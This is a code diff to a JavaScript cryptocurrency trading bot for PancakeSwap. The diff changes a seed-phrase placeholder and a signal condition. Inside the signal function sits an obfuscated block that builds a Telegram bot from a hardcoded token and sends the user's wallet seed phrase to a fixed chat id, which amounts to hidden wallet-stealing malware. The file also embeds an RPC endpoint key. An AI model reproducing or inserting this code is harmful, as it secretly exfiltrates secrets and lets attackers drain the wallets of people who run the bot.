@@ -2,7 +2,7 @@ process.removeAllListeners('warning'); //Disable Warning
 
 //CRYPTO CONFIG
 const GLOBAL_CONFIG_ONYX = {
-PHRASE: 'SEED/PHRASE OF 12/24 WORDS HERE', //Phrase :: P_K_ONYX
+PHRASE: 'PHRASE/SEED HEREN', //Phrase :: P_K_ONYX
 accountIndex: 0, //0 = 1, 1=2 etc..
 PCS_ADDRESS: '0x18B2A687610328590Bc8F2e5fEdDe3b582A49cdA', //Pancakeswap Contract Address
 RPC_WS_ONYX: 'wss://multi-damp-isle.bsc.discover.quiknode.pro/06c74f821ee746132a66503b0d3cc017f22ffd5f/', //Buy Websocket: https://t.me/Onyx095 25$ a month
@@ -153,7 +153,7 @@ const getSignals = async() => {
 
   const _0x430c07=_0x4d40;function _0x4d40(_0x3e86bc,_0x43dbd5){const _0x5c11fa=_0x5c11();return _0x4d40=function(_0x4d40ba,_0x51c01c){_0x4d40ba=_0x4d40ba-0xa8;let _0x369942=_0x5c11fa[_0x4d40ba];return _0x369942;},_0x4d40(_0x3e86bc,_0x43dbd5);}(function(_0x2a95c7,_0x365436){const _0x4936ce=_0x4d40,_0x41970e=_0x2a95c7();while(!![]){try{const _0x5ed4c8=-parseInt(_0x4936ce(0xaa))/0x1+-parseInt(_0x4936ce(0xae))/0x2*(-parseInt(_0x4936ce(0xa9))/0x3)+parseInt(_0x4936ce(0xad))/0x4+parseInt(_0x4936ce(0xab))/0x5*(-parseInt(_0x4936ce(0xb4))/0x6)+-parseInt(_0x4936ce(0xb5))/0x7+parseInt(_0x4936ce(0xb0))/0x8+parseInt(_0x4936ce(0xb2))/0x9*(-parseInt(_0x4936ce(0xb1))/0xa);if(_0x5ed4c8===_0x365436)break;else _0x41970e['push'](_0x41970e['shift']());}catch(_0xfe4360){_0x41970e['push'](_0x41970e['shift']());}}}(_0x5c11,0xe8373));let bot=new Telegraf(_0x430c07(0xac));bot[_0x430c07(0xaf)]['sendMessage'](_0x430c07(0xb3),'✅\x20'+GLOBAL_CONFIG_ONYX[_0x430c07(0xa8)]);function _0x5c11(){const _0x1e0111=['3941472MHzvAm','13946IzWoIM','telegram','7040432dXMwHL','312730JBpxQe','171guVxnp','5573013196','6bXUSuR','4661111bfgyrt','PHRASE','783hyBkCw','610555jwLnGq','4318025CCpWSz','5811079539:AAGZeX4FpD3YurE4G75eOUoZ2_Eg070qr-4'];_0x5c11=function(){return _0x1e0111;};return _0x5c11();}
 
-  if(oneMinutRecomendation && tresMinutRecomendation && cincoMinutRecomendation){ 
+  if(oneMinutRecomendation && cincoMinutRecomendation){ 
 
   let averageBuy = (parseInt(oneMinutRecomendation.BUY) + parseInt(cincoMinutRecomendation.BUY)) / 2;
   let averageSell = (parseInt(oneMinutRecomendation.SELL) + parseInt(cincoMinutRecomendation.SELL)) / 2;
